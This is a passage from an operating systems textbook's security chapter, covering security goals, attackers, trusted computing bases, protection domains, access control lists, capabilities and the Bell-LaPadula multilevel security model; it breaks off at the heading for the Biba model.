The first, confidentiality, is concerned with having secret data remain secret. More specifically, if the owner of some data has decided that these data are to be made available only to certain people and no others, the system should guarantee that release of the data to unauthorized people never occurs. As an absolute minimum, the owner should be able to specify who can see what, and the system should enforce these specifications, which ideally should be per file.

| Goal | Threat |
| --- | --- |
| Confidentiality | Exposure of data |
| Integrity | Tampering with data |
| Availability | Denial of service |

Figure 9-1. Security goals and threats.

The second property, integrity, means that unauthorized users should not be able to modify any data without the owner’s permission. Data modification in this context includes not only changing the data, but also removing data and adding false data. If a system cannot guarantee that data deposited in it remain unchanged until the owner decides to change them, it is not worth much for data storage.

The third property, availability, means that nobody can disturb the system to make it unusable. Such denial-of-service attacks are increasingly common. For example, if a computer is an Internet server, sending a flood of requests to it may cripple it by eating up all of its CPU time just examining and discarding incoming requests. If it takes, say, $100 \mu \mathrm{sec}$ to process an incoming request to read a Web page, then anyone who manages to send 10,000 requests/sec can wipe it out. Reasonable models and technology for dealing with attacks on confidentiality and integrity are available; foiling denial-of-service attacks is much harder.

Later on, people decided that three fundamental properties were not enough for all possible scenarios, and so they added additional ones, such as authenticity, accountability, nonrepudiability, privacy, and others. Clearly, these are all nice to
have. Even so, the original three still have a special place in the hearts and minds of most (elderly) security experts.

Systems are under constant threat from attackers. For instance, an attacker may sniff the traffic on a local area network and break the confidentiality of the information, especially if the communication protocol does not use encryption. Likewise, an intruder may attack a database system and remove or modify some of the records, breaking their integrity. Finally, a judiciously placed denial-of-service attack may destroy the availability of one or more computer systems.

There are many ways in which an outsider can attack a system; we will look at some of them later in this chapter. Many of the attacks nowadays are supported by highly advanced tools and services. Some of these tools are built by so-called “black-hat” hackers, others by “white hats.” Just like in the old Western movies, the bad guys in the digital world wear black hats and ride Trojan horses-the good hackers wear white hats and code faster than their shadows.

Incidentally, the popular press tends to use the generic term “hacker” exclusively for the black hats. However, within the computer world, “hacker” is a term of honor reserved for great programmers. While some of these are rogues, most are not. The press got this one wrong. In deference to true hackers, we will use the term in the original sense and will call people who try to break into computer systems where they do not belong either crackers or black hats.

Going back to the attack tools, it may come as a surprise that many of them are developed by white hats. The explanation is that, while the baddies may (and do) use them also, these tools primarily serve as convenient means to test the security of a computer system or network. For instance, a tool like nmap helps attackers determine the network services offered by a computer system by means of a portscan. One of the simplest scanning techniques offered by nmap is to try and set up TCP connections to every possible port number on a computer system. If the connection setup to a port succeeds, there must be a server listening on that port. Moreover, since many services use well-known port numbers, it allows the security tester (or attacker) to find out in detail what services are running on a machine. Phrased differently, nmap is useful for attackers as well as defenders, a property that is known as dual use. Another set of tools, collectively referred to as dsniff, offers a variety of ways to monitor network traffic and redirect network packets. The Low Orbit Ion Cannon (LOIC), meanwhile, is not (just) a SciFi weapon to vaporize enemies in a galaxy far away, but also a tool to launch denial-of-service attacks. And with the Metasploit framework that comes preloaded with hundreds of convenient exploits against all sorts of targets, launching attacks was never easier. Clearly, all these tools have dual-use issues. Like knives and axes, it does not mean they are bad per se.

However, cybercriminals also offer a wide range of (often online) services to wannabe cyber kingpins: to spread malware, launder money, redirect traffic, provide hosting with a no-questions-asked policy, and many other useful things. Most criminal activities on the Internet build on infrastructures known as botnets that
consist of thousands (and sometimes millions) of compromised computers-often normal computers of innocent and ignorant users. There are all-too-many ways in which attackers can compromise a user’s machine. For instance, they may offer free, but malicious versions of popular software. The sad truth is that the promise of free (“cracked”) versions of expensive software is irresistible to many users. Unfortunately, the installation of such programs gives the attacker full access to the machine. It is like handing over the key to your house to a perfect stranger. When the computer is under control of the attacker, it is known as a bot or zombie. Typically, none of this is visible to the user. Nowadays, botnets consisting of hundreds of thousands of zombies are the workhorses of many criminal activities. A few hundred thousand PCs are a lot of machines to pilfer for banking details, or to use for spam, and just think of the carnage that may ensue when a million zombies aim their LOIC weapons at an unsuspecting target.

Sometimes, the effects of the attack go well beyond the computer systems themselves and reach directly into the physical world. One example is the attack on the waste management system of Maroochy Shire, in Queensland, Australia-not too far from Brisbane. A disgruntled ex-employee of a sewage system installation company was not amused when the Maroochy Shire Council turned down his job application and he decided not to get mad, but to get even. He took control of the sewage system and caused a million liters of raw sewage to spill into the parks, rivers and coastal waters (where fish promptly died)-as well as other places.

More generally, there are folks out there who bear a grudge against some particular country or (ethnic) group or who are just angry at the world in general and want to destroy as much infrastructure as they can without too much regard to the nature of the damage or who the specific victims are. Usually such people feel that attacking their enemies’ computers is a good thing, but the attacks themselves may not be well targeted.

At the opposite extreme is cyberwarfare. A cyberweapon commonly referred to as Stuxnet physically damaged the centrifuges in a uranium enrichment facility in Natanz, Iran, and is said to have caused a significant slowdown in Iran’s nuclear program. While no one has come forward to claim credit for this attack, something that sophisticated probably originated with the secret services of one or more countries hostile to Iran.

One important aspect of the security problem, related to confidentiality, is privacy: protecting individuals from misuse of information about them. This quickly gets into many legal and moral issues. Should the government compile dossiers on everyone in order to catch $X$-cheaters, where $X$ is “welfare” or “tax,” depending on your politics? Should the police be able to look up anything on anyone in order to stop organized crime? What about the U.S. National Security Agency’s monitoring millions of cell phones daily in the hope of catching would-be terrorists? Do employers and insurance companies have rights? What happens when these rights conflict with individual rights? All of these issues are extremely important but are beyond the scope of this book.

### 9.1.2 Attackers

Most people are pretty nice and obey the law, so why worry about security? Because there are unfortunately a few people around who are not so nice and want to cause trouble (possibly for their own commercial gain). In the security literature, people who are nosing around places where they have no business being are called attackers, intruders, or sometimes adversaries. A few decades ago, cracking computer systems was all about showing your friends how clever you were, but nowadays this is no longer the only or even the most important reason to break into a system. There are many different types of attacker with different kinds of motivation: theft, hacktivism, vandalism, terrorism, cyberwarfare, espionage, spam, extortion, fraud-and occasionally the attacker still simply wants to show off, or expose the poor security of an organization.

Attackers similarly range from not very skilled wannabe black hats, also referred to as script-kiddies, to extremely skillful crackers. They may be professionals working for criminals, governments (e.g., the police, the military, or the secret services), or security firms-or hobbyists that do all their hacking in their spare time. It should be clear that trying to keep a hostile foreign government from stealing military secrets is quite a different matter from trying to keep students from inserting a funny message-of-the-day into the system. The amount of effort needed for security and protection clearly depends on who the enemy is thought to be.

### 9.2 OPERATING SYSTEMS SECURITY

There are many ways to compromise the security of a computer system. Often they are not sophisticated at all. For instance, many people set their PIN codes to 0000, or their password to “password” - easy to remember, but not very secure. There are also people who do the opposite. They pick very complicated passwords, so that they cannot remember them, and have to write them down on a Post-it note which they attach to their screen or keyboard. This way, anyone with physical access to the machine (including the cleaning staff, secretary, and all visitors) also has access to everything on the machine. There are many other examples, and they include high-ranking officials losing USB sticks with sensitive information, old hard drives with trade secrets that are not properly wiped before being dropped in the recycling bin, and so on.

Nevertheless, some of the most important security incidents are due to sophisticated cyber attacks. In this book, we are specifically interested in attacks that are related to the operating system. In other words, we will not look at Web attacks, or attacks on SQL databases. Instead, we focus on attacks where the operating system is either the target of the attack or plays an important role in enforcing (or more commonly, failing to enforce) the security policies.

In general, we distinguish between attacks that passively try to steal information and attacks that actively try to make a computer program misbehave. An example of a passive attack is an adversary that sniffs the network traffic and tries to break the encryption (if any) to get to the data. In an active attack, the intruder may take control of a user’s Web browser to make it execute malicious code, for instance to steal credit card details. In the same vein, we distinguish between cryptography, which is all about shuffling a message or file in such a way that it becomes hard to recover the original data unless you have the key, and software hardening, which adds protection mechanisms to programs to make it hard for attackers to make them misbehave. The operating system uses cryptography in many places: to transmit data securely over the network, to store files securely on disk, to scramble the passwords in a password file, etc. Program hardening is also used all over the place: to prevent attackers from injecting new code into running software, to make sure that each process has exactly those privileges it needs to do what it is supposed to do and no more, etc.

### 9.2.1 Can We Build Secure Systems?

Nowadays, it is hard to open a newspaper without reading yet another story about attackers breaking into computer systems, stealing information, or controlling millions of computers. A naive person might logically ask two questions concerning this state of affairs:

1. Is it possible to build a secure computer system?
2. If so, why is it not done?

The answer to the first one is: “In theory, yes.” In principle, software can be free of bugs and we can even verify that it is secure-as long as that software is not too large or complicated. Unfortunately, computer systems today are horrendously complicated and this has a lot to do with the second question. The second question, why secure systems are not being built, comes down to two fundamental reasons. First, current systems are not secure but users are unwilling to throw them out. If Microsoft were to announce that in addition to Windows it had a new product, SecureOS, that was resistant to viruses but did not run Windows applications, it is far from certain that every person and company would drop Windows like a hot potato and buy the new system immediately. In fact, Microsoft has a secure OS (Fandrich et al., 2006) but is not marketing it.

The second issue is more subtle. The only known way to build a secure system is to keep it simple. Features are the enemy of security. The good folks in the Marketing Dept. at most tech companies believe (rightly or wrongly) that what users want is more features, bigger features, and better features. They make sure that the system architects designing their products get the word. However, all these mean more complexity, more code, more bugs, and more security errors.

Here are two fairly simple examples. The first email systems sent messages as ASCII text. They were simple and could be made fairly secure. Unless there are really dumb bugs in the email program, there is little an incoming ASCII message can do to damage a computer system (we will actually see some attacks that may be possible later in this chapter). Then people got the idea to expand email to include other types of documents, for example, Word files, which can contain programs in macros. Reading such a document means running somebody else’s program on your computer. No matter how much sandboxing is used, running a foreign program on your computer is inherently more dangerous than looking at ASCII text. Did users demand the ability to change email from passive documents to active programs? Probably not, but somebody thought it would be a nifty idea, without worrying too much about the security implications.

The second example is the same thing for Web pages. When the Web consisted of passive HTML pages, it did not pose a major security problem. Now that many Web pages contain programs (applets and JavaScript) that the user has to run to view the content, one security leak after another pops up. As soon as one is fixed, another takes its place. When the Web was entirely static, were users up in arms demanding dynamic content? Not that the authors remember, but its introduction brought with it a raft of security problems. It looks like the Vice-President-In-Charge-Of-Saying-No was asleep at the wheel.

Actually, there are some organizations that think good security is more important than nifty new features, the military being the prime example. In the following sections we will look some of the issues involved, but they can be summarized in one sentence. To build a secure system, have a security model at the core of the operating system that is simple enough that the designers can actually understand it, and resist all pressure to deviate from it in order to add new features.

### 9.2.2 Trusted Computing Base

In the security world, people often talk about trusted systems rather than secure systems. These are systems that have formally stated security requirements and meet these requirements. At the heart of every trusted system is a minimal TCB (Trusted Computing Base) consisting of the hardware and software necessary for enforcing all the security rules. If the trusted computing base is working to specification, the system security cannot be compromised, no matter what else is wrong.

The TCB typically consists of most of the hardware (except I/O devices that do not affect security), a portion of the operating system kernel, and most or all of the user programs that have superuser power (e.g., SETUID root programs in UNIX). Operating system functions that must be part of the TCB include process creation, process switching, memory management, and part of file and I/O management. In a secure design, often the TCB will be quite separate from the rest of the operating system in order to minimize its size and verify its correctness.

An important part of the TCB is the reference monitor, as shown in Fig. 9-2. The reference monitor accepts all system calls involving security, such as opening files, and decides whether they should be processed or not. The reference monitor thus allows all the security decisions to be put in one place, with no possibility of bypassing it. Most operating systems are not designed this way, which is part of the reason they are so insecure.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-063_484_1094_514_220.jpg)

Figure 9-2. A reference monitor.

One of the goals of some current security research is to reduce the trusted computing base from millions of lines of code to merely tens of thousands of lines of code. In Fig. 1-26 we saw the structure of the MINIX 3 operating system, which is a POSIX-conformant system but with a radically different structure than Linux or FreeBSD. With MINIX 3, only about 10.000 lines of code run in the kernel. Everything else runs as a set of user processes. Some of these, like the file system and the process manager, are part of the trusted computing base since they can easily compromise system security. But other parts, such as the printer driver and the audio driver, are not part of the trusted computing base and no matter what is wrong with them (even if they are taken over by a virus), there is nothing they can do to compromise system security. By reducing the trusted computing base by two orders of magnitude, systems like MINIX 3 can potentially offer much higher security than conventional designs.

### 9.3 CONTROLLING ACCESS TO RESOURCES

Security is easier to achieve if there is a clear model of what is to be protected and who is allowed to do what. Quite a bit of work has been done in this area, so we can only scratch the surface in this brief treatment. We will focus on a few general models and the mechanisms for enforcing them.

### 9.3.1 Protection Domains

A computer system contains many resources, or “objects,” that need to be protected. These objects can be hardware (e.g., CPUs, memory pages, disk drives, or printers) or software (e.g., processes, files, databases, or semaphores).

Each object has a unique name by which it is referenced, and a finite set of operations that processes are allowed to carry out on it. The read and write operations are appropriate to a file; up and down make sense on a semaphore.

It is obvious that a way is needed to prohibit processes from accessing objects that they are not authorized to access. Furthermore, this mechanism must also make it possible to restrict processes to a subset of the legal operations when that is needed. For example, process $A$ may be entitled to read, but not write, file $F$.

In order to discuss different protection mechanisms, it is useful to introduce the concept of a domain. A domain is a set of (object, rights) pairs. Each pair specifies an object and some subset of the operations that can be performed on it. A right in this context means permission to perform one of the operations. Often a domain corresponds to a single user, telling what the user can do and not do, but a domain can also be more general than just one user. For example, the members of a programming team working on some project might all belong to the same domain so that they can all access the project files.

How objects are allocated to domains depends on the specifics of who needs to know what. One basic concept, however, is the POLA (Principle of Least Authority) or need to know. In general, security works best when each domain has the minimum objects and privileges to do its work-and no more.

Figure 9-3 shows three domains, showing the objects in each domain and the rights (Read, Write, eXecute) available on each object. Note that Printer1 is in two domains at the same time, with the same rights in each. File1 is also in two domains, with different rights in each one.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-064_266_925_1488_305.jpg)

Figure 9-3. Three protection domains.

At every instant of time, each process runs in some protection domain. In other words, there is some collection of objects it can access, and for each object it has some set of rights. Processes can also switch from domain to domain during execution. The rules for domain switching are highly system dependent.

To make the idea of a protection domain more concrete, let us look at UNIX (including Linux, FreeBSD, and friends). In UNIX, the domain of a process is defined by its UID and GID. When a user logs in, his shell gets the UID and GID contained in his entry in the password file and these are inherited by all its children. Given any (UID, GID) combination, it is possible to make a complete list of all objects (files, including I/O devices represented by special files, etc.) that can be accessed, and whether they can be accessed for reading, writing, or executing. Two processes with the same (UID, GID) combination will have access to exactly the same set of objects. Processes with different (UID, GID) values will have access to a different set of files, although there may be considerable overlap.

Furthermore, each process in UNIX has two halves: the user part and the kernel part. When the process does a system call, it switches from the user part to the kernel part. The kernel part has access to a different set of objects from the user part. For example, the kernel can access all the pages in physical memory, the entire disk, and all the other protected resources. Thus, a system call causes a domain switch.

When a process does an exec on a file with the SETUID or SETGID bit on, it acquires a new effective UID or GID. With a different (UID, GID) combination, it has a different set of files and operations available. Running a program with SETUID or SETGID is also a domain switch, since the rights available change.

An important question is how the system keeps track of which object belongs to which domain. Conceptually, at least, one can envision a large matrix, with the rows being domains and the columns being objects. Each box lists the rights, if any, that the domain contains for the object. The matrix for Fig. 9-3 is shown in Fig. 9-4. Given this matrix and the current domain number, the system can tell if an access to a given object in a particular way from a specified domain is allowed.

| Domain | File1 | File2 | File3 | File4 | File5 | File6 | Printer1 | Plotter2 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | Read | Read Write |  |  |  |  |  |  |
| 2 |  |  | Read | Read Write Execute | Read Write |  | Write |  |
| 3 |  |  |  |  |  | Read Write Execute | Write | Write |

Figure 9-4. A protection matrix.

Domain switching itself can be easily included in the matrix model by realizing that a domain is itself an object, with the operation enter. Figure 9-5 shows the matrix of Fig. 9-4 again, only now with the three domains as objects themselves. Processes in domain 1 can switch to domain 2, but once there, they cannot go back.

This situation models executing a SETUID program in UNIX. No other domain switches are permitted in this example.

| Domain | File1 | File2 | File3 | File4 | File5 | Object File6 | Printer1 | Plotter2 | Domain1 | Domain2 | Domain3 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | Read | Read Write |  |  |  |  |  |  |  | Enter |  |
| 2 |  |  | Read | Read Write Execute | Read Write |  | Write |  |  |  |  |
| 3 |  |  |  |  |  | Read Write Execute | Write | Write |  |  |  |

Figure 9-5. A protection matrix with domains as objects.

### 9.3.2 Access Control Lists

In practice, actually storing the matrix of Fig. 9-5 is rarely done because it is large and sparse. Most domains have no access at all to most objects, so storing a very large, mostly empty, matrix is a waste of disk space. Two methods that are practical, however, are storing the matrix by rows or by columns, and then storing only the nonempty elements. The two approaches are surprisingly different. In this section we will look at storing it by column; in the next we will study storing it by row.

The first technique consists of associating with each object an (ordered) list containing all the domains that may access the object, and how. This list is called the ACL (Access Control List) and is illustrated in Fig. 9-6. Here we see three processes, each belonging to a different domain, $A, B$, and $C$, and three files $F 1$, $F 2$, and $F 3$. For simplicity, we will assume that each domain corresponds to exactly one user, in this case, users $A, B$, and $C$. Often in the security literature the users are called subjects or principals, to contrast them with the things owned, the objects, such as files.

Each file has an ACL associated with it. File F1 has two entries in its ACL (separated by a semicolon). The first entry says that any process owned by user $A$ may read and write the file. The second entry says that any process owned by user $B$ may read the file. All other accesses by these users and all accesses by other users are forbidden. Note that the rights are granted by user, not by process. As far as the protection system goes, any process owned by user $A$ can read and write file F1. It does not matter if there is one such process or 100 of them. It is the owner, not the process ID, that matters.

File $F 2$ has three entries in its ACL: $A, B$, and $C$ can all read the file, and $B$ can also write it. No other accesses are allowed. File F3 is apparently an executable program, since $B$ and $C$ can both read and execute it. $B$ can also write it.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-067_522_1160_239_188.jpg)

Figure 9-6. Use of access control lists to manage file access.

This example illustrates the most basic form of protection with ACLs. More sophisticated systems are often used in practice. To start with, we have shown only three rights so far: read, write, and execute. There may be additional rights as well. Some of these may be generic, that is, apply to all objects, and some may be object specific. Examples of generic rights are destroy object and copy object. These could hold for any object, no matter what type it is. Object-specific rights might include append message for a mailbox object and sort alphabetically for a directory object.

So far, our ACL entries have been for individual users. Many systems support the concept of a group of users. Groups have names and can be included in ACLs. Two variations on the semantics of groups are possible. In some systems, each process has a user ID (UID) and group ID (GID). In such systems, an ACL entry contains entries of the form

```
UID1, GID1: rights1; UID2, GID2: rights2; ...
```

Under these conditions, when a request is made to access an object, a check is made using the caller’s UID and GID. If they are present in the ACL, the rights listed are available. If the (UID, GID) combination is not in the list, the access is not permitted.

Using groups this way effectively introduces the concept of a role. Consider a computer installation in which Tana is system administrator, and thus in the group sysadm. However, suppose that the company also has some clubs for employees and Tana is a member of the pigeon fanciers club. Club members belong to the group pigfan and have access to the company’s computers for managing their pigeon database. A portion of the ACL might be as shown in Fig. 9-7.

If Tana tries to access one of these files, the result depends on which group she is currently logged in as. When she logs in, the system may ask her to choose which of her groups she is currently using, or there might even be different login

| File | Access control list |
| --- | --- |
| Password | tana, sysadm: RW |
| Pigeon_data | bill, pigfan: RW; tana, pigfan: RW; … |

Figure 9-7. Two access control lists.

names and/or passwords to keep them separate. The point of this scheme is to prevent Tana from accessing the password file when she currently has her pigeon fancier’s hat on. She can do that only when logged in as the system administrator.

In some cases, a user may have access to certain files independent of which group she is currently logged in as. That case can be handled by introducing the concept of a wildcard, which means everyone. For example, the entry

```
tana, *: RW
```

for the password file would give Tana access no matter which group she was currently in as.

Yet another possibility is that if a user belongs to any of the groups that have certain access rights, the access is permitted. The advantage here is that a user belonging to multiple groups does not have to specify which group to use at login time. All of them count all of the time. A disadvantage of this approach is that it provides less encapsulation: Tana can edit the password file during a pigeon club meeting.

The use of groups and wildcards introduces the possibility of selectively blocking a specific user from accessing a file. For example, the entry

```
virgil, *: (none); *, *: RW
```

gives the entire world except for Virgil read and write access to the file. This works because the entries are scanned in order, and the first one that applies is taken; subsequent entries are not even examined. A match is found for Virgil on the first entry and the access rights, in this case, “none” are found and applied. The search is terminated at that point. The fact that the rest of the world has access is never even seen.

The other way of dealing with groups is not to have ACL entries consist of (UID, GID) pairs, but to have each entry be a UID or a GID. For example, an entry for the file pigeon_data could be

```
debbie: RW; phil: RW; pigfan: RW
```

meaning that Debbie and Phil, and all members of the pigfan group have read and write access to the file.

It sometimes occurs that a user or a group has certain permissions with respect to a file that the file owner later wishes to revoke. With access-control lists, it is relatively straightforward to revoke a previously granted access. All that has to be
done is edit the ACL to make the change. However, if the ACL is checked only when a file is opened, most likely the change will take effect only on future calls to open. Any file that is already open will continue to have the rights it had when it was opened, even if the user is no longer authorized to access the file.

### 9.3.3 Capabilities

The other way of slicing up the matrix of Fig. 9-5 is by rows. When this method is used, associated with each process is a list of objects that may be accessed, along with an indication of which operations are permitted on each, in other words, its domain. This list is called a capability list (or C-list) and the individual items on it are called capabilities (Dennis and Van Horn, 1966; Fabry, 1974). A set of three processes and their capability lists is shown in Fig. 9-8.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-069_516_1161_852_188.jpg)

Figure 9-8. When capabilities are used, each process has a capability list.

Each capability grants the owner certain rights on a certain object. In Fig. 9-8, the process owned by user $A$ can read files $F 1$ and $F 2$, for example. Usually, a capability consists of a file (or more generally, an object) identifier and a bitmap for the various rights. In a UNIX-like system, the file identifier would probably be the i-node number. Capability lists are themselves objects and may be pointed to from other capability lists, thus facilitating sharing of subdomains.

It is fairly obvious that capability lists must be protected from user tampering. Three methods of protecting them are known. The first way requires a tagged architecture, a hardware design in which each memory word has an extra (or tag) bit that tells whether the word contains a capability or not. The tag bit is not used by arithmetic, comparison, or similar ordinary instructions, and it can be modified only by programs running in kernel mode (i.e., the operating system). Tagged-ar-chitecture machines have been built and can be made to work well (Feustal, 1972). The IBM AS/400 is a popular example.

The second way is to keep the C-list inside the operating system. Capabilities are then referred to by their position in the capability list. A process might say: “Read 1 KB from the file pointed to by capability 2.” This form of addressing is similar to using file descriptors in UNIX. Hydra (Wulf et al., 1974) worked this way.

The third way is to keep the C-list in user space, but manage the capabilities cryptographically so that users cannot tamper with them. This approach is particularly suited to distributed systems and works as follows. When a client process sends a message to a remote server, for example, a file server, to create an object for it, the server creates the object and generates a long random number, the check field, to go with it. A slot in the server’s file table is reserved for the object and the check field is stored there along with the addresses of the disk blocks. In UNIX terms, the check field is stored on the server in the i-node. It is not sent back to the user and never put on the network. The server then generates and returns a capability to the user of the form shown in Fig. 9-9.

| Server | Object | Rights | f(Objects, Rights, Check) |
| --- | --- | --- | --- |

Figure 9-9. A cryptographically protected capability.

The capability returned to the user contains the server’s identifier, the object number (the index into the server’s tables, essentially, the i-node number), and the rights, stored as a bitmap. For a newly created object, all the rights bits are turned on, of course, because the owner can do everything. The last field consists of the concatenation of the object, rights, and check field run through a cryptographically secure one-way function, $f$. A cryptographically secure one-way function is a function $y=f(x)$ that has the property that given $x$ it is easy to find $y$, but given $y$ it is computationally infeasible to find $x$. We will discuss them in detail in Section 9.5. For now, it suffices to know that with a good one-way function, even a determined attacker will not be able to guess the check field, even if he knows all the other fields in the capability.

When the user wishes to access the object, she sends the capability to the server as part of the request. The server then extracts the object number to index into its tables to find the object. It then computes f (Object, Rights, Check), taking the first two parameters from the capability itself and the third from its own tables. If the result agrees with the fourth field in the capability, the request is honored; otherwise, it is rejected. If a user tries to access someone else’s object, he will not be able to fabricate the fourth field correctly since he does not know the check field, and the request will be rejected.

A user can ask the server to produce a weaker capability, for example, for readonly access. First the server verifies that the capability is valid. If so, it computes $f$ (Object,New_rights,Check) and generates a new capability putting this value in
the fourth field. Note that the original Check value is used because other outstanding capabilities depend on it.

This new capability is sent back to the requesting process. The user can now give this to a friend by just sending it in a message. If the friend turns on rights bits that should be off, the server will detect this when the capability is used since the $f$ value will not correspond to the false rights field. Since the friend does not know the true check field, he cannot fabricate a capability that corresponds to the false rights bits. This scheme was developed for the Amoeba system (Tanenbaum et al., 1990).

In addition to the specific object-dependent rights, such as read and execute, capabilities (both kernel and cryptographically protected) usually have generic rights which are applicable to all objects. Examples of generic rights are

1. Copy capability: create a new capability for the same object.
2. Copy object: create a duplicate object with a new capability.
3. Remove capability: delete an entry from the C-list; object unaffected.
4. Destroy object: permanently remove an object and a capability.

A last remark worth making about capability systems is that revoking access to an object is quite difficult in the kernel-managed version. It is hard for the system to find all the outstanding capabilities for any object to take them back, since they may be stored in C-lists all over the disk. One approach is to have each capability point to an indirect object, rather than to the object itself. By having the indirect object point to the real object, the system can always break that connection, thus invalidating the capabilities. (When a capability to the indirect object is later presented to the system, the user will discover that the indirect object is now pointing to a null object.)

In the Amoeba scheme, revocation is easy. All that needs to be done is change the check field stored with the object. In one blow, all existing capabilities are invalidated. However, neither scheme allows selective revocation, that is, taking back, say, John’s permission, but nobody else’s. This defect is generally recognized to be a problem with all capability systems.

Another general problem is making sure the owner of a valid capability does not give a copy to 1000 of his best friends. Having the kernel manage capabilities, as in Hydra, solves the problem, but this solution does not work well in a distributed system such as Amoeba.

Very briefly summarized, ACLs and capabilities have somewhat complementary properties. Capabilities are very efficient because if a process says “Open the file pointed to by capability 3” no checking is needed. With ACLs, a (potentially long) search of the ACL may be needed. If groups are not supported, then granting everyone read access to a file requires enumerating all users in the ACL. Capabilities also allow a process to be encapsulated easily, whereas ACLs do not. On the
other hand, ACLs allow selective revocation of rights, which capabilities do not. Finally, if an object is removed and the capabilities are not or vice versa, problems arise. ACLs do not suffer from this problem.

Most users are familiar with ACLs, because they are common in operating systems like Windows and UNIX. However, capabilities are not that uncommon either. For instance, the L4 kernel that runs on many smartphones from many manufacturers (typically alongside or underneath other operating systems like Android), is capability based. Likewise, the FreeBSD has embraced Capsicum, bringing capabilities to a popular member of the UNIX family.

### 9.4 FORMAL MODELS OF SECURE SYSTEMS

Protection matrices, such as that of Fig. 9-4, are not static. They frequently change as new objects are created, old objects are destroyed, and owners decide to increase or restrict the set of users for their objects. A considerable amount of attention has been paid to modeling protection systems in which the protection matrix is constantly changing. We will now touch briefly upon some of this work.

Decades ago, Harrison et al. (1976) identified six primitive operations on the protection matrix that can be used as a base to model any protection system. These primitive operations are create object, delete object, create domain, delete domain, insert right, and remove right. The two latter primitives insert and remove rights from specific matrix elements, such as granting domain 1 permission to read File6.

These six primitives can be combined into protection commands. It is these protection commands that user programs can execute to change the matrix. They may not execute the primitives directly. For example, the system might have a command to create a new file, which would test to see if the file already existed, and if not, create a new object and give the owner all rights to it. There might also be a command to allow the owner to grant permission to read the file to everyone in the system, in effect, inserting the “read” right in the new file’s entry in every domain.

At any instant, the matrix determines what a process in any domain can do, not what it is authorized to do. The matrix is what is enforced by the system; authorization has to do with management policy. As an example of this distinction, let us consider the simple system of Fig. 9-10 in which domains correspond to users. In Fig. 9-10(a) we see the intended protection policy: Henry can read and write mailbox7, Robert can read and write secret, and all three users can read and execute compiler.

Now imagine that Robert is very clever and has found a way to issue commands to have the matrix changed to Fig. 9-10(b). He has now gained access to mailbox7, something he is not authorized to have. If he tries to read it, the operating system will carry out his request because it does not know that the state of Fig. 9-10(b) is unauthorized.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-073_422_1211_237_156.jpg)

Figure 9-10. (a) An authorized state. (b) An unauthorized state.

It should now be clear that the set of all possible matrices can be partitioned into two disjoint sets: the set of all authorized states and the set of all unauthorized states. A question around which much theoretical research has revolved is this: “Given an initial authorized state and a set of commands, can it be proven that the system can never reach an unauthorized state?”

In effect, we are asking if the available mechanism (the protection commands) is adequate to enforce some protection policy. Given this policy, some initial state of the matrix, and the set of commands for modifying the matrix, what we would like is a way to prove that the system is secure. Such a proof turns out quite difficult to acquire; many general-purpose systems are not theoretically secure. Harrison et al. (1976) proved that in the case of an arbitrary configuration for an arbitrary protection system, security is theoretically undecidable. However, for a specific system, it may be possible to prove whether the system can ever move from an authorized state to an unauthorized state. For more information, see Landwehr (1981).

### 9.4.1 Multilevel Security

Most operating systems allow individual users to determine who may read and write their files and other objects. This policy is called discretionary access control. In many environments this model works fine, but there are other environments where much tighter security is required, such as the military, corporate patent departments, and hospitals. In the latter environments, the organization has stated rules about who can see what, and these may not be modified by individual soldiers, lawyers, or doctors, at least not without getting special permission from the boss (and probably from the boss’ lawyers as well). These environments need mandatory access controls to ensure that the stated security policies are enforced by the system, in addition to the standard discretionary access controls. What these mandatory access controls do is regulate the flow of information, to make sure that it does not leak out in a way it is not supposed to.

## The Bell-LaPadula Model

The most widely used multilevel security model is the Bell-LaPadula model so we will start there (Bell and LaPadula, 1973). This model was designed for handling military security, but it is also applicable to other organizations. In the military world, documents (objects) can have a security level, such as unclassified, confidential, secret, and top secret. People are also assigned these levels, depending on which documents they are allowed to see. A general might be allowed to see all documents, whereas a lieutenant might be restricted to documents cleared as confidential and lower. A process running on behalf of a user acquires the user’s security level. Since there are multiple security levels, this scheme is called a multilevel security system.

The Bell-LaPadula model has rules about how information can flow:

1. The simple security property: A process running at security level $k$ can read only objects at its level or lower. For example, a general can read a lieutenant’s documents but a lieutenant cannot read a general’s documents.
2. The * property: A process running at security level $k$ can write only objects at its level or higher. For example, a lieutenant can append a message to a general’s mailbox telling everything he knows, but a general cannot append a message to a lieutenant’s mailbox telling everything he knows because the general may have seen top-secret documents that may not be disclosed to a lieutenant.

Roughly summarized, processes can read down and write up, but not the reverse. If the system rigorously enforces these two properties, it can be shown that no information can leak out from a higher security level to a lower one. The $*$ property was so named because in the original report, the authors could not think of a good name for it and used * as a temporary placeholder until they could devise a better name. They never did and the report was printed with the *. In this model, processes read and write objects, but do not communicate with each other directly. The Bell-LaPadula model is illustrated graphically in Fig. 9-11.

In this figure a (solid) arrow from an object to a process indicates that the process is reading the object, that is, information is flowing from the object to the process. Similarly, a (dashed) arrow from a process to an object indicates that the process is writing into the object, that is, information is flowing from the process to the object. Thus all information flows in the direction of the arrows. For example, process $B$ can read from object 1 but not from object 3.

The simple security property says that all solid (read) arrows go sideways or upward. The * property says that all dashed (write) arrows also go sideways or upward. Since information flows only horizontally or upward, any information that starts out at level $k$ can never appear at a lower level. In other words, there is never

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-075_671_1268_245_135.jpg)

Figure 9-11. The Bell-LaPadula multilevel security model.

a path that moves information downward, thus guaranteeing the security of the model.

The Bell-LaPadula model refers to organizational structure, but ultimately has to be enforced by the operating system. One way this could be done is by assigning each user a security level, to be stored along with other user-specific data such as the UID and GID. Upon login, the user’s shell would acquire the user’s security level and this would be inherited by all its children. If a process running at security level $k$ attempted to open a file or other object whose security level is greater than $k$, the operating system should reject the open attempt. Similarly attempts to open any object of security level less than $k$ for writing must fail.

## The Biba Model

